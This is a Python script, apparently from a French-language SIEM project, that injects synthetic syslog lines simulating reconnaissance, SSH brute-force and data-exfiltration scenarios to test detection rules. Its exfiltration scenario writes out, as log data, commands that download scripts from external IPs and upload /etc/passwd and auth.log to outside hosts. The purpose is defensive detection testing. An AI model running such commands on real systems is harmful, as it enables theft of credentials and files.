#!/usr/bin/env python3
"""
Smart SIEM S2 — Simulation d'attaques MITRE ATT&CK
====================================================
Injecte des logs syslog RFC3164 réalistes via POST /api/v1/logs/ingest/bulk
pour déclencher les règles de corrélation S2.

Usage :
  python3 scripts/security/simulate_attack.py --scenario all
  python3 scripts/security/simulate_attack.py --scenario 1 --url http://localhost:8000
  python3 scripts/security/simulate_attack.py --scenario 2 --api-key dev-only-change-me

Stdlib uniquement — aucune dépendance externe.
"""

import argparse
import json
import random
import urllib.request
import urllib.error
from datetime import datetime, timezone, timedelta


# ── Helpers ─────────────────────────────────────────────────────────────────────

def _syslog_date(offset_seconds: int = 0) -> str:
    """Date RFC3164 : 'Jun 30 14:05:00'"""
    dt = datetime.now(timezone.utc) - timedelta(seconds=abs(offset_seconds))
    return dt.strftime("%b %d %H:%M:%S")


def _rfc3164(pri: int, host: str, prog: str, pid: int, msg: str, offset: int = 0) -> str:
    """Construit une ligne syslog RFC3164 conforme au parseur backend."""
    return f"<{pri}>{_syslog_date(offset)} {host} {prog}[{pid}]: {msg}"


def _bulk_payload(raw_messages: list[str]) -> list[dict]:
    """Convertit des lignes syslog brutes en payload pour /api/v1/logs/ingest/bulk."""
    return [{"raw_message": msg, "source": "syslog"} for msg in raw_messages]


def _post_bulk(url: str, api_key: str, raw_messages: list[str]) -> dict:
    """Envoie un lot de messages syslog bruts vers le backend."""
    endpoint = url.rstrip("/") + "/api/v1/logs/ingest/bulk"
    payload = json.dumps(_bulk_payload(raw_messages)).encode("utf-8")
    req = urllib.request.Request(
        endpoint,
        data=payload,
        headers={"Content-Type": "application/json", "X-API-Key": api_key},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            body = json.loads(resp.read().decode("utf-8"))
            return {"status": resp.status, "body": body}
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8") if exc.fp else ""
        return {"status": exc.code, "body": body, "error": str(exc)}
    except Exception as exc:
        return {"status": 0, "body": "", "error": str(exc)}


def _print_sep(title: str) -> None:
    print("\n" + "=" * 60)
    print(f"  {title}")
    print("=" * 60)


def _print_result(result: dict) -> None:
    if result.get("error"):
        print(f"  [ERREUR] HTTP {result['status']} — {result['error']}")
        if result.get("body"):
            print(f"  Détail : {str(result['body'])[:300]}")
    else:
        body = result["body"]
        ok  = body.get("total_inserted", "?")
        err = body.get("total_failed",   "?")
        print(f"  [OK] HTTP {result['status']} — {ok} indexés, {err} erreurs")


# ── Scénario 1 — Reconnaissance (T1595 / T1046) ─────────────────────────────────

def build_scenario_1(attacker_ip: str = "203.0.113.42") -> list[str]:
    """
    Simule une phase de reconnaissance externe :
    - Scans de ports bloqués (kernel DROP)
    - Tentatives d'accès aux pages sensibles avec codes 401/403
    Doit déclencher RULE_001 (auth failures) et RULE_004 (IP suspecte multi-cible).
    """
    msgs = []
    # 12 scans de ports bloqués par le firewall/kernel
    ports = [22, 23, 3306, 5432, 6379, 8080, 8443, 9200, 27017, 5900, 21, 25]
    for i, port in enumerate(ports):
        msgs.append(_rfc3164(
            28, "fw-01", "kernel", 1,
            f"DROP IN=eth0 OUT= SRC={attacker_ip} DST=10.0.0.1 PROTO=TCP DPT={port} SPT=54{i:03d}",
            offset=i * 5,
        ))
    # 10 tentatives d'auth échouées sur chemins sensibles (sshd / nginx / app)
    paths = ["/admin", "/phpinfo.php", "/.env", "/actuator", "/wp-admin",
             "/phpmyadmin", "/config.php", "/.git/config", "/api/admin", "/console"]
    for i, path in enumerate(paths):
        msgs.append(_rfc3164(
            34, "web-01", "sshd", 1234 + i,
            f"Failed password for root from {attacker_ip} port {40000 + i} ssh2",
            offset=60 + i * 3,
        ))
    return msgs


def run_scenario_1(url: str, api_key: str) -> None:
    _print_sep("Scénario 1 — Reconnaissance (T1595 / T1046)")
    attacker = "203.0.113.42"
    msgs = build_scenario_1(attacker)
    print(f"  IP attaquante : {attacker}")
    print(f"  Logs injectés : {len(msgs)}")
    print(f"  Règles visées : RULE_001 (auth failures), RULE_004 (IP suspecte)")
    result = _post_bulk(url, api_key, msgs)
    _print_result(result)


# ── Scénario 2 — Mouvement latéral (T1021 / T1110) ─────────────────────────────

def build_scenario_2(attacker_ip: str = "10.10.0.99") -> list[str]:
    """
    Simule un mouvement latéral par brute-force SSH multi-hôtes :
    - 6 tentatives par hôte sur 4 hôtes distincts
    - RULE_001 déclenche sur threshold=5 par IP dans la fenêtre 10min
    - RULE_004 déclenche sur même IP touchant 3+ hôtes
    """
    msgs = []
    targets = ["web-01", "web-02", "db-master", "auth-srv"]
    users = ["root", "admin", "deploy", "ubuntu"]
    for host_idx, host in enumerate(targets):
        for attempt in range(6):
            user = random.choice(users)
            port = 40000 + host_idx * 100 + attempt
            msgs.append(_rfc3164(
                34, host, "sshd", 1000 + host_idx * 10 + attempt,
                f"Failed password for {user} from {attacker_ip} port {port} ssh2",
                offset=host_idx * 30 + attempt * 4,
            ))
    return msgs


def run_scenario_2(url: str, api_key: str) -> None:
    _print_sep("Scénario 2 — Mouvement latéral (T1021 / T1110)")
    attacker = "10.10.0.99"
    msgs = build_scenario_2(attacker)
    print(f"  IP attaquante : {attacker}")
    print(f"  Hôtes ciblés  : web-01, web-02, db-master, auth-srv")
    print(f"  Logs injectés : {len(msgs)} (6 tentatives × 4 hôtes)")
    print(f"  Règles visées : RULE_001 (brute force SSH ≥5), RULE_004 (même IP sur 4 hôtes)")
    result = _post_bulk(url, api_key, msgs)
    _print_result(result)


# ── Scénario 3 — Exfiltration (T1041) ───────────────────────────────────────────

def build_scenario_3(attacker_ip: str = "192.168.1.77") -> list[str]:
    """
    Simule une exfiltration de données :
    - Commandes wget/curl vers IPs externes avec keyword exfil
    - Flux réseau sortants volumineux
    - Doit déclencher RULE_004 (outbound / exfil keywords)
    """
    external_ips = ["185.220.101.42", "45.33.32.156", "198.51.100.77"]
    msgs = []

    # Commandes exfil dans les logs système (auditd / bash history / syslog app)
    exfil_cmds = [
        f"cmd='wget http://{external_ips[0]}/exfil.sh -O /tmp/data_exfil.tar.gz' uid=0",
        f"cmd='curl -O http://{external_ips[1]}/collect.py' outbound data exfil uid=0",
        f"outbound transfer scp /var/log/auth.log root@{external_ips[2]}:/data_exfil/",
        f"curl -X POST http://{external_ips[0]}/upload -F file=@/etc/passwd outbound exfil",
        f"wget http://{external_ips[1]}/beacon.sh exfil outbound data transfer",
    ]
    for i, cmd in enumerate(exfil_cmds):
        msgs.append(_rfc3164(
            28, "db-master", "auditd", 999,
            f"EXECVE a0='sh' a1='-c' a2='{cmd}'",
            offset=i * 10,
        ))

    # Flux réseau sortants volumineux (firewall logs)
    for i in range(5):
        ext_ip = external_ips[i % len(external_ips)]
        size_mb = 150 + i * 200
        msgs.append(_rfc3164(
            28, "fw-01", "kernel", 1,
            f"ACCEPT OUT=eth0 SRC={attacker_ip} DST={ext_ip} PROTO=TCP DPT=443"
            f" outbound data_exfil {size_mb}MB transferred",
            offset=50 + i * 15,
        ))

    # Alertes IDS avec keyword exfil
    for i in range(6):
        msgs.append(_rfc3164(
            28, "ids-01", "snort", 100 + i,
            f"[1:2100498:7] GPL ATTACK_RESPONSE id check returned root exfil"
            f" {attacker_ip}->185.220.101.{i + 1}:80 bytes_out=52428800",
            offset=100 + i * 8,
        ))

    return msgs


def run_scenario_3(url: str, api_key: str) -> None:
    _print_sep("Scénario 3 — Exfiltration de données (T1041)")
    attacker = "192.168.1.77"
    msgs = build_scenario_3(attacker)
    print(f"  IP source     : {attacker}")
    print(f"  Logs injectés : {len(msgs)}")
    print(f"  Règles visées : RULE_004 (outbound/exfil keywords)")
    result = _post_bulk(url, api_key, msgs)
    _print_result(result)


# ── Main ──────────────────────────────────────────────────────────────────────────

def main() -> None:
    parser = argparse.ArgumentParser(
        description="Smart SIEM S2 — Simulation d'attaques MITRE ATT&CK",
    )
    parser.add_argument(
        "--scenario", choices=["1", "2", "3", "all"], default="all",
        help="Scénario : 1=Reconnaissance, 2=Mouvement latéral, 3=Exfiltration, all=tous",
    )
    parser.add_argument("--url", default="http://localhost:8000", help="URL du backend SIEM")
    parser.add_argument("--api-key", default="dev-only-change-me", help="X-API-Key")
    args = parser.parse_args()

    print("\n╔══════════════════════════════════════════════════════════╗")
    print("║  Smart SIEM S2 — Simulation d'attaques MITRE ATT&CK    ║")
    print("╚══════════════════════════════════════════════════════════╝")
    print(f"  Backend : {args.url}")
    print(f"  Scénario: {args.scenario}")

    runners = {"1": run_scenario_1, "2": run_scenario_2, "3": run_scenario_3}

    if args.scenario == "all":
        for key in ["1", "2", "3"]:
            runners[key](args.url, args.api_key)
    else:
        runners[args.scenario](args.url, args.api_key)

    print("\n" + "=" * 60)
    print("  Simulation terminée.")
    print("  Lancer la corrélation : POST /api/correlation/run")
    print("  Vérifier les alertes  : GET  /api/alerts")
    print("  Vérifier les audits   : GET  /api/audit")
    print("=" * 60 + "\n")


if __name__ == "__main__":
    main()
